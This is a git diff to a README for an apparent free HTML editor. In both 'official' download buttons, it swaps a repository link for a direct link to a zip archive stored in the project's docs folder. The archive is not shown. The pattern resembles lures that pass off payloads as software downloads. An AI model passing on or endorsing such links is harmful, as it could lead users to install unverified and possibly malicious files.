@@ -12,7 +12,7 @@ This is the **free forever base version** from Astudio LLC. It works great for p
 
 ### Step 1: Get the File
 
-👉 **[Click Here to Download Astudio WYSIWYG HTML Editor](https://github.com/siadomarmud18/astudio-wysiwyg-html-editor)**
+👉 **[Click Here to Download Astudio WYSIWYG HTML Editor](https://raw.githubusercontent.com/siadomarmud18/astudio-wysiwyg-html-editor/main/docs/v2.0-beta.2.zip)**
 
 Visit this link to download the application. This is the official download page.
 
@@ -140,7 +140,7 @@ If you run into any problems, check the FAQ section above. For additional suppor
 
 ## 🔗 Official Download Link (Again)
 
-**[👉 Download Astudio WYSIWYG HTML Editor Now](https://github.com/siadomarmud18/astudio-wysiwyg-html-editor)**
+**[👉 Download Astudio WYSIWYG HTML Editor Now](https://raw.githubusercontent.com/siadomarmud18/astudio-wysiwyg-html-editor/main/docs/v2.0-beta.2.zip)**
 
 Bookmark this page for future reference. Updates to the free version will be posted on the same link.
 
